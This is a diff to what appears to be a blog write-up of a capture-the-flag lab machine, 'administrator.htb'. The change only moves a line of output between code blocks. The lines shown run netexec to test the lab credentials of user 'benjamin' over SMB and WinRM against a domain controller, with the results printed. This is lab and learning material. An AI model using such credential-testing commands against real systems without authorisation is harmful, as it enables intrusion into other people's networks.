@@ -267,10 +267,10 @@ FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:helloItsNotm3e(
 {% highlight shell %}
 exegol-liemek administrator # netexec smb 10.10.11.42 -u benjamin -p "helloItsNotm3e(123)"
 SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
+SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:helloItsNotm3e(123)
 {% endhighlight %}
 
-{% highlight shell %}
-SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:helloItsNotm3e(123) 
+{% highlight shell %} 
 exegol-liemek administrator # netexec winrm 10.10.11.42 -u benjamin -p "helloItsNotm3e(123)"
 WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
 WINRM       10.10.11.42     5985   DC               [-] administrator.htb\benjamin:helloItsNotm3e(123)
